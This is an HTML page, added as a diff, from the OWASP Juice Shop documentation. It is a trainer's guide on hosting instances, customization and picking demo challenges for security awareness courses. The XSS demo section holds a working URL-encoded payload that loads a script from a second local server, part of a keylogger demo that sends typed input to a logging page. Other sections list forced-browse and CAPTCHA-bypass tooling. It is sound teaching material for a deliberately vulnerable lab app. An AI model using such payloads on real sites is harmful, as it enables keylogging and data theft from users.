@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Trainer&#8217;s guide :: Juice Shop Docs</title>
+    <meta name="generator" content="Antora 3.1.4">
+    <link rel="stylesheet" href="../../../../_/css/site.css">
+    <script>var uiRootPath = '../../../../_'</script>
+  </head>
+  <body class="article">
+<header class="header">
+  <nav class="navbar">
+    <div class="navbar-brand">
+      <a class="navbar-item" href="../../../..">Juice Shop Docs</a>
+      <button class="navbar-burger" data-target="topbar-nav">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+    </div>
+    <div id="topbar-nav" class="navbar-menu">
+      <div class="navbar-end">
+        <a class="navbar-item" href="#">Home</a>
+        <div class="navbar-item has-dropdown is-hoverable">
+          <a class="navbar-link" href="#">Products</a>
+          <div class="navbar-dropdown">
+            <a class="navbar-item" href="#">Product A</a>
+            <a class="navbar-item" href="#">Product B</a>
+            <a class="navbar-item" href="#">Product C</a>
+          </div>
+        </div>
+        <div class="navbar-item has-dropdown is-hoverable">
+          <a class="navbar-link" href="#">Services</a>
+          <div class="navbar-dropdown">
+            <a class="navbar-item" href="#">Service A</a>
+            <a class="navbar-item" href="#">Service B</a>
+            <a class="navbar-item" href="#">Service C</a>
+          </div>
+        </div>
+        <div class="navbar-item">
+          <span class="control">
+            <a class="button is-primary" href="#">Download</a>
+          </span>
+        </div>
+      </div>
+    </div>
+  </nav>
+</header>
+<div class="body">
+<div class="nav-container" data-component="Juice Shop" data-version="test">
+  <aside class="nav">
+    <div class="panels">
+<div class="nav-panel-menu is-active" data-panel="menu">
+  <nav class="nav-menu">
+    <h3 class="title"><a href="../../index.html">Juice shop Documentation</a></h3>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="0">
+<ul class="nav-list">
+  <li class="nav-item" data-depth="1">
+    <button class="nav-item-toggle"></button>
+    <span class="nav-text">Preface</span>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../introduction/readme.html">Introduction</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../introduction/motivation.html">Why OWASP Juice Shop exists</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../introduction/architecture.html">Architecture overview</a>
+  </li>
+</ul>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <button class="nav-item-toggle"></button>
+    <span class="nav-text">Part I - Hacking preparations</span>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part1/README.html">Hacking preparations</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part1/running.html">Running OWASP Juice Shop</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part1/categories.html">Vulnerability categories</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part1/challenges.html">Challenge tracking</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part1/rules.html">Hacking exercise rules</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part1/happy-path.html">Walking the "happy path"</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part1/customization.html">Customization</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part1/ctf.html">Hosting a CTF event</a>
+  </li>
+</ul>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <button class="nav-item-toggle"></button>
+    <span class="nav-text">Part II - Challenge hunting</span>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/README.html">Challenge hunting</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/score-board.html">Finding the Score Board</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/injection.html">Injection</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/broken-authentication.html">Broken Authentication</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/sensitive-data-exposure.html">Sensitive Data Exposure</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/xxe.html">XML External Entities (XXE)</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/improper-input-validation.html">Improper Input Validation</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/broken-access-control.html">Broken Access Control</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/security-misconfiguration.html">Security Misconfiguration</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/xss.html">Cross Site Scripting (XSS)</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/insecure-deserialization.html">Insecure Deserialization</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/vulnerable-components.html">Vulnerable Components</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/security-through-obscurity.html">Security through Obscurity</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/unvalidated-redirects.html">Unvalidated Redirects</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/broken-anti-automation.html">Broken Anti-Automation</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/cryptographic-issues.html">Cryptographic Issues</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part2/miscellaneous.html">Miscellaneous</a>
+  </li>
+</ul>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <button class="nav-item-toggle"></button>
+    <span class="nav-text">Part III - Getting involved</span>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part3/README.html">Getting involved</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part3/feedback.html">Provide feedback</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part3/contribution.html">Contribute to development</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part3/codebase.html">Codebase 101</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part3/translation.html">Help with translation</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part3/tutorials.html">Hacking Instructor tutorial scripts</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../part3/donations.html">Donations</a>
+  </li>
+</ul>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <button class="nav-item-toggle"></button>
+    <span class="nav-text">Appendix</span>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="solutions.html">Challenge solutions</a>
+  </li>
+  <li class="nav-item is-current-page" data-depth="2">
+    <a class="nav-link" href="trainers.html">Trainer&#8217;s guide</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="troubleshooting.html">Troubleshooting</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="cheat-detection.html">Cheat detection</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="code-snippets.html">Coding challenges</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="integration.html">Integration</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="monitoring.html">Monitoring</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="chatbot.html">Chatbot training data</a>
+  </li>
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="lyrics.html">Jingle lyrics</a>
+  </li>
+</ul>
+  </li>
+  <li class="nav-item" data-depth="1">
+    <button class="nav-item-toggle"></button>
+    <span class="nav-text">Postface</span>
+<ul class="nav-list">
+  <li class="nav-item" data-depth="2">
+    <a class="nav-link" href="../introduction/about.html">About this book</a>
+  </li>
+</ul>
+  </li>
+</ul>
+  </li>
+</ul>
+  </nav>
+</div>
+<div class="nav-panel-explore" data-panel="explore">
+  <div class="context">
+    <span class="title">Juice shop Documentation</span>
+    <span class="version">test</span>
+  </div>
+  <ul class="components">
+    <li class="component is-current">
+      <a class="title" href="../../index.html">Juice shop Documentation</a>
+      <ul class="versions">
+        <li class="version is-current is-latest">
+          <a href="../../index.html">test</a>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</div>
+    </div>
+  </aside>
+</div>
+<main class="article">
+<div class="toolbar" role="navigation">
+<button class="nav-toggle"></button>
+<nav class="breadcrumbs" aria-label="breadcrumbs">
+  <ul>
+    <li><a href="../../index.html">Juice shop Documentation</a></li>
+    <li>Appendix</li>
+    <li><a href="trainers.html">Trainer&#8217;s guide</a></li>
+  </ul>
+</nav>
+<div class="edit-this-page"><a href="file:///Users/parthnanda/Desktop/development/juice-shop-documentation-test/modules/Root/pages/appendix/trainers.adoc">Edit this Page</a></div>
+</div>
+  <div class="content">
+<aside class="toc sidebar" data-title="Contents" data-levels="2">
+  <div class="toc-menu"></div>
+</aside>
+<article class="doc">
+<h1 class="page">Trainer&#8217;s guide</h1>
+<div id="preamble">
+<div class="sectionbody">
+<div class="paragraph">
+<p>Co-authored by <a href="https://github.com/wurstbrot">Timo Pagel</a></p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_instances"><a class="anchor" href="#_instances"></a>Instances</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Make sure all participants have their own running Juice Shop instance to
+work with. While attempting challenges like
+<a href="../part2/insecure-deserialization.html" class="xref page">RCE</a> or <a href="../part2/xxe.html" class="xref page">XXE</a>
+students might occasionally take down their server and would severely
+impact other participants if they shared an instance.</p>
+</div>
+<div class="paragraph">
+<p>There are multiple <a href="../part1/running.adoc#run-options">Run Options</a> which
+you can choose from. It is perfectly fine to run multiple docker
+containers on one host. They do not effect each other.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_customization"><a class="anchor" href="#_customization"></a>Customization</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Especially in awareness trainings for management you might want to
+create a higher immersion by making the Juice Shop look like an
+application in the corporate design of the participants' own company.
+Juice Shop offers
+<a href="../part1/customization.html" class="xref page">various customization options</a> to achieve
+this.</p>
+</div>
+<div class="paragraph">
+<p>Several custom configurations already come packaged with the Juice Shop
+source code, the two most sophisticated ones being
+<a href="https://github.com/juice-shop/juice-shop/blob/master/config/7ms.yml">7 Minute Security</a>
+and
+<a href="https://github.com/juice-shop/juice-shop/blob/master/config/mozilla.yml">Mozilla</a>.</p>
+</div>
+<div class="paragraph">
+<p>In addition, you might want to disable all challenge notifications
+during awareness trainings to avoid distraction. The
+<a href="https://github.com/juice-shop/juice-shop/blob/master/config/quiet.yml">Quiet</a>
+configuration demonstrates the necessary options to achieve this.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="../_images/appendix/quiet_mode.png" alt="Quiet mode">
+</div>
+</div>
+<div class="paragraph">
+<p>For a really sophisticated and immersive demo consider performing some
+<a href="../part1/customization.adoc#additional-browser-tweaks">Additional Browser tweaks</a>.
+These will let you use OAuth2 login via Google and cast the illusion
+that coupon codes were actually tweeted by your customer&#8217;s company.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_classroom_hints"><a class="anchor" href="#_classroom_hints"></a>Classroom hints</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>In a class room setup you have to find a way to distribute the URL of
+each instance to the participants. For small groups, it is probably fine
+to just spin up a number of containers and tell all participants which
+URL they have to use. An example to spin up 10 Docker containers on a
+UNIX based system is to run</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>for i in {10..19}; do docker run -d -p 40$i:3000 bkimminich/juice-shop; done</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>If you want to track progress centrally during the training, you might
+want to <a href="../part1/ctf.html" class="xref page">host a central CTF server</a> where participants
+can post the challenges they already solved. You might consider turning
+off public visibility of the leader board on the CTF server unless you
+want to encourage the students to hack very competitively.</p>
+</div>
+<div class="sect2">
+<h3 id="_hosting_individual_instances_for_multiple_users"><a class="anchor" href="#_hosting_individual_instances_for_multiple_users"></a>Hosting individual instances for multiple users</h3>
+<div class="imageblock">
+<div class="content">
+<img src="../_images/appendix/multi-juicer_cover.svg" alt="MultiJuicer cover">
+</div>
+</div>
+<div class="paragraph">
+<p>A solution to host and manage individual Juice Shop instances for
+multiple users is
+<a href="https://github.com/iteratec/multi-juicer/">MultiJuicer</a>. MultiJuicer is
+a Kubernetes based system to start up the required Juice Shop instances
+on demand. It will also clean up unused instances after a configured
+period of inactivity.</p>
+</div>
+<div class="paragraph">
+<p>MultiJuicer comes with a custom-built load balancer. It allows every
+participant (or a CTF team) to use the same URL, but their traffic will
+always be sent to their own personal instance.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="../_images/appendix/multi-juicer_high-level-architecture.svg" alt="MultiJuicer high level architecture">
+</div>
+</div>
+<div class="paragraph">
+<p>Registration at MultiJuicer is very straightforward for the users/teams.
+Messing with other instances is prevented by assigning a passcode to
+each of them which should only be shared among team members - or not at
+all for individuals.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="../_images/appendix/multi-juicer_register.png" alt="MultiJuicer registration">
+</div>
+</div>
+<div class="paragraph">
+<p>MultiJuicer comes with a rudimentary Score Board of its own, which allows teams to compare their progress through
+the Juice Shop challenges.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="../_images/appendix/multi-juicer_scoreboard.png" alt="MultiJuicer score board">
+</div>
+</div>
+<div class="paragraph">
+<p>Another helpful feature for the trainer MultiJuicer is the <a href="https://github.com/iteratec/multi-juicer/blob/master/guides/monitoring-setup/monitoring.adoc">optional
+dashboard which automatically consumes and displays metrics</a> from each of
+its Juice Shop instances. It shows individual challenge progress along with other
+functional and technical stats and can be very helpful in
+troubleshooting as well.</p>
+</div>
+<div class="paragraph">
+<p><span class="image"><img src="../_images/appendix/multi-juicer_dashboard.png" alt="MultiJuicer dashboard with technical metrics"></span>
+<span class="image"><img src="../_images/appendix/multi-juicer_dashboard1.png" alt="MultiJuicer dashboard with business metrics"></span></p>
+</div>
+<div class="paragraph">
+<p>The MultiJuicer repository offers guidance on <a href="https://github.com/iteratec/multi-juicer#installation-guides-for-specific-cloud-providers">how to set up the
+system on different cloud provider platforms</a>,
+such as Digital Ocean, OpenShift, AWS or Azure.</p>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_existing_trainings"><a class="anchor" href="#_existing_trainings"></a>Existing trainings</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>One existing training which uses the Juice Shop for example is
+<a href="https://drive.google.com/open?id=1ITkTAALjZJnGV-hhAZ-zQfNx1sVTzlA2UlWD0s270ig">Timo Pagel&#8217;s University Module</a>.
+The structure mostly is as follows:</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Introduce a topic (e.g. SQL Injection)</p>
+</li>
+<li>
+<p>Let the participants try it out in the Juice Shop</p>
+</li>
+<li>
+<p>Show mitigation/counter measures</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>The 2nd semester web attack chapters of
+<a href="https://github.com/bkimminich/it-security-lecture">Björn Kimminich&#8217;s IT Security Lecture</a>
+follow a similar pattern of</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Introduction</p>
+</li>
+<li>
+<p>Timeboxed exercise</p>
+</li>
+<li>
+<p>Demonstration of the hack (for all who did not finish the exercise in
+time)</p>
+</li>
+<li>
+<p>Explaining mitigation and prevention</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>You can find more links to existing material in the
+<a href="https://github.com/juice-shop/juice-shop/blob/master/REFERENCES.adoc#lectures-and-trainings">Lectures and Trainings section</a>
+of the project references on on GitHub.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_challenges_for_demos"><a class="anchor" href="#_challenges_for_demos"></a>Challenges for demos</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>The following challenges are well suited for live demonstrations in
+trainings or talks. You should <strong>always</strong> begin by showing how to find
+the
+<a href="../part2/score-board.adoc#find-the-carefully-hidden-score-board-page">Score Board</a>
+( ⭐ ) so you can then pick any of the challenge below to further
+demonstrate certain categories of vulnerabilities.</p>
+</div>
+<table class="tableblock frame-all grid-all stretch">
+<colgroup>
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+</colgroup>
+<thead>
+<tr>
+<th class="tableblock halign-left valign-top">Challenge</th>
+<th class="tableblock halign-left valign-top">Category</th>
+<th class="tableblock halign-left valign-top">Difficulty</th>
+<th class="tableblock halign-left valign-top">Time for demo</th>
+<th class="tableblock halign-left valign-top">Dependencies</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/xss.adoc#perform-a-dom-xss-attack">DOM XSS</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">XSS</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⭐</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">None</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/sensitive-data-exposure.adoc#access-a-confidential-document">Confidential Document</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Sensitive Data Exposure</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⭐</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">None</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/injection.adoc#log-in-with-the-administrators-user-account">Login Admin</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Injection</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⭐⭐</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">None</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/miscellaneous.adoc#read-our-privacy-policy">Privacy Policy</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Miscellaneous</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⭐</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Log in as any user</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/xss.adoc#perform-a-reflected-xss-attack">Reflected XSS</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">XSS</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⭐⭐</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Log in as any user and complete checkout process (to find the vulnerable tracking link)</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/security-through-obscurity.adoc#prove-that-you-actually-read-our-privacy-policy">Privacy Policy Inspection</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Security through Obscurity</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⭐⭐⭐</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/miscellaneous.adoc#read-our-privacy-policy">Privacy Policy</a></p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/broken-access-control.adoc#access-the-administration-section-of-the-store">Admin Section</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Broken Access Control</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⭐⭐</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/injection.adoc#log-in-with-the-administrators-user-account">Login Admin</a> or <a href="../part2/improper-input-validation.adoc#register-as-a-user-with-administrator-privileges">Admin Registration</a></p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/broken-access-control.adoc#view-another-users-shopping-basket">View Basket</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Broken Access Control</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⭐⭐</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Log in with two different users</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/broken-access-control.adoc#find-the-hidden-easter-egg">Easter Egg</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Broken Access Control</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⭐⭐⭐⭐</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳⏳⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Explain <em>Poison Null Byte</em></p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/cryptographic-issues.adoc#apply-some-advanced-cryptanalysis-to-find-the-real-easter-egg">Nested Easter Egg</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Cryptographic Issues</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⭐⭐⭐⭐</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳⏳⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/broken-access-control.adoc#find-the-hidden-easter-egg">Easter Egg</a></p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/sensitive-data-exposure.adoc#access-a-developers-forgotten-backup-file">Forgotten Developer Backup</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Sensitive Data Exposure</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⭐⭐⭐⭐</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳⏳⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Explain <em>Poison Null Byte</em></p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/cryptographic-issues.adoc#forge-a-coupon-code-that-gives-you-a-discount-of-at-least-80">Forged Coupon</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Cryptographic Issues</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⭐⭐⭐⭐⭐⭐</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳⏳⏳⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="../part2/sensitive-data-exposure.adoc#access-a-developers-forgotten-backup-file">Forgotten Developer Backup</a> and <code>z85-cli</code> installed <strong>or</strong> <a href="../part2/sensitive-data-exposure.adoc#access-a-salesmans-forgotten-backup-file">Forgotten Sales Backup</a> <strong>or</strong> tracing coupons from Twitter back to <a href="https://github.com/juice-shop/juicy-coupon-bot/actions?query=workflow%3A%22Monthly+Coupon+Distribution%22" class="bare">https://github.com/juice-shop/juicy-coupon-bot/actions?query=workflow%3A%22Monthly+Coupon+Distribution%22</a></p></td>
+</tr>
+</tbody>
+</table>
+<div class="sect2">
+<h3 id="_xss_demo"><a class="anchor" href="#_xss_demo"></a>XSS demo</h3>
+<div class="paragraph">
+<p>A particularly impressive
+<a href="https://github.com/wurstbrot/shake-logger">showcase of XSS site-defacement combined with a keylogger</a>
+is provided explicitly for live demos and awareness trainings:</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Install <a href="https://www.docker.com/">Docker</a>.</p>
+</li>
+<li>
+<p>Run <code>git clone https://github.com/wurstbrot/shake-logger</code>.</p>
+</li>
+<li>
+<p>Run <code>cd shake-logger</code> and then <code>docker-compose up</code>.</p>
+</li>
+<li>
+<p>Turn on your speakers and make sure your browser is allowed to play
+sound.</p>
+</li>
+<li>
+<p>Open
+<a href="http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dowasp%22%3BsearchQuery.value%20%3D%20%22owasp%22%3B%60%29%27%3C%2Fimg%3Eowasp">this link</a>
+to launch the XSS demo (🔊).</p>
+</li>
+<li>
+<p>Use the application normally, e.g. doing a search and logging in with
+some user.</p>
+</li>
+<li>
+<p>In a new tab go to <a href="http://localhost:8080/logger.php" class="bare">http://localhost:8080/logger.php</a> to see that all
+user input was transmitted to a third-party server.</p>
+</li>
+<li>
+<p>Show the Network tab of the browser window with Juice Shop to see the
+requests that are sent to the <code>logger.php</code> script.</p>
+</li>
+<li>
+<p>Reload the Juice Shop with <code>F5</code> and use the application a bit more.</p>
+</li>
+<li>
+<p>You will see that no more logging takes place as XSS payload was
+removed during the reload.</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>There is also a video recording available on YouTube:
+<a href="https://youtu.be/Msi52Kicb-w" class="bare">https://youtu.be/Msi52Kicb-w</a>. This is a good fallback in case the
+Docker-based setup does not work for you.</p>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_teaching_automation_of_security_tools"><a class="anchor" href="#_teaching_automation_of_security_tools"></a>Teaching automation of security tools</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Only a few challenges in OWASP Juice Shop are <em>explicitly</em> expecting to
+utilize the power of automation, mostly in the form of some brute force
+attack. Quite a few more challenges are still <em>well-suited</em> for teaching
+the use of automated tools . The following table gives you an idea on
+complexity and expected time consumption for each of these, so you can
+plan your training accordingly.</p>
+</div>
+<table class="tableblock frame-all grid-all stretch">
+<colgroup>
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+</colgroup>
+<thead>
+<tr>
+<th class="tableblock halign-left valign-top">Tool</th>
+<th class="tableblock halign-left valign-top">Description</th>
+<th class="tableblock halign-left valign-top">Effort to automate</th>
+<th class="tableblock halign-left valign-top">Execution runtime</th>
+<th class="tableblock halign-left valign-top">Challenges (Auto-solve?)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">OWASP ZAP <em>Traditional Spider</em> or  <em>Forced Browse</em> with <a href="https://raw.githubusercontent.com/daviddias/node-dirbuster/master/lists/directory-list-lowercase-2.3-small.txt">small (or bigger) OWASP DirBuster list</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Finds <code>/ftp</code> folder with many misplaced files <em>and</em> <code>/promotion</code> (and direct <code>/video</code>) path with jingle video</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">🧠</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Confidential Document(❌), Forgotten Developer Backup(❌), Forgotten Sales Backup(❌), Misplaced Signature File(❌), Login Support Team(❌), Video XSS(❌)</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">OWASP ZAP <em>Forced Browse</em> with <a href="https://raw.githubusercontent.com/daviddias/node-dirbuster/master/lists/directory-list-lowercase-2.3-big.txt">big OWASP DirBuster list</a></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Finds <code>/encryptionkeys</code> directory with <code>jwt.pub</code> <em>and</em> <code>premium.key</code> key files</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">🧠</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳⏳⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Forged Signed JWT(❌), Premium Challenge(❌)</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><a href="https://github.com/aaronhnatiw/race-the-web">RaceTheWeb</a> config (or custom Bash, Python etc. script) sending 10 sequential <code>POST</code> requests to <a href="http://localhost:3000/api/Feedbacks">Feedback API endpoint</a> within 10 seconds</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Must pin <code>captchaId</code> and <code>captcha</code> from one initially received and solved CAPTCHA</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">🧠(🧠)</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">⏳</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">CAPTCHA Bypass(✔️)</p></td>
+</tr>
+<tr>
